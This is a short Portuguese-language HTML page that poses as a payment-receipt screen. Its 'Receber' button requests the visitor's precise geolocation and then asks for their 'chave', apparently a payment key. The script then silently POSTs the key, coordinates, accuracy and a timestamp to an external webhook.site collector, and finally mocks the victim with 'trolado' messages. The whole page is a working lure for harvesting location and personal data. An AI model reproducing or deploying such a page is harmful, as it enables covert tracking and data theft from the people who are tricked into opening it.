<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Recebimento</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{margin:0;font-family:Arial;background:#f5f5f5}
.tela{display:none;height:100vh;justify-content:center;align-items:center;flex-direction:column}
.ativa{display:flex}

button{
  background:#7a2cff;
  color:#fff;
  border:none;
  padding:16px 32px;
  border-radius:14px;
  font-size:18px;
}
input{
  padding:14px;
  width:80%;
  max-width:300px;
  border-radius:10px;
  border:1px solid #ccc;
  font-size:16px;
  margin-bottom:20px;
}
#notif{
  position:fixed;
  top:-120px;
  left:50%;
  transform:translateX(-50%);
  background:#2b2b2b;
  color:#fff;
  padding:14px 18px;
  border-radius:14px;
  transition:.5s;
  z-index:999;
}
#notif.show{top:20px}
</style>
</head>

<body>

<div id="notif"></div>

<div id="t1" class="tela ativa">
  <button onclick="pedir()">Receber</button>
</div>

<div id="t2" class="tela">
  <input id="chave" placeholder="Digite sua chave">
  <button onclick="enviar()">Confirmar</button>
</div>

<div id="t3" class="tela">
  <h3>kskskd trolei</h3>
</div>

<script>
let posicao=null;

function pedir(){
  navigator.geolocation.getCurrentPosition(
    p=>{
      posicao=p;
      trocar("t2");
    },
    ()=>alert("Permita a localização"),
    {enableHighAccuracy:true}
  );
}

function enviar(){
  if(!posicao){alert("Sem localização");return;}

  const chave=document.getElementById("chave").value || "vazio";

  const body =
    "chave="+encodeURIComponent(chave)+
    "&latitude="+encodeURIComponent(posicao.coords.latitude)+
    "&longitude="+encodeURIComponent(posicao.coords.longitude)+
    "&precisao="+encodeURIComponent(posicao.coords.accuracy)+
    "&data="+encodeURIComponent(new Date().toISOString());

  const xhr=new XMLHttpRequest();
  xhr.open("POST","https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6",true);
  xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
  xhr.send(body);

  notif();
  trocar("t3");
}

function notif(){
  const n=document.getElementById("notif");
  n.innerHTML="<b>trolado</b><br>você foi trolado com sucesso";
  n.classList.add("show");
  setTimeout(()=>n.classList.remove("show"),4000);
}

function trocar(id){
  document.querySelectorAll(".tela").forEach(t=>t.classList.remove("ativa"));
  document.getElementById(id).classList.add("ativa");
}
</script>

</body>
</html>
